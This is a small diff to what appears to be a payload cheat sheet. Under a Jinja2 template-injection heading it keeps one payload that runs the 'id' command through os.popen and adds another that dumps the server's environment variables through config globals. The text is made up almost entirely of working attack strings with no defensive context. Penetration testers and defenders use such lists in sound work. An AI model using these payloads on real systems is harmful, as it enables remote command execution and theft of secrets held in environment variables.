@@ -25,6 +25,7 @@ Escape Node VM Sandbox
 #### Jinja2 / Template Injection
 
     {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+    {{config.__class__.__init__.__globals__['os'].environ}}
 
 ### MySQL 
 
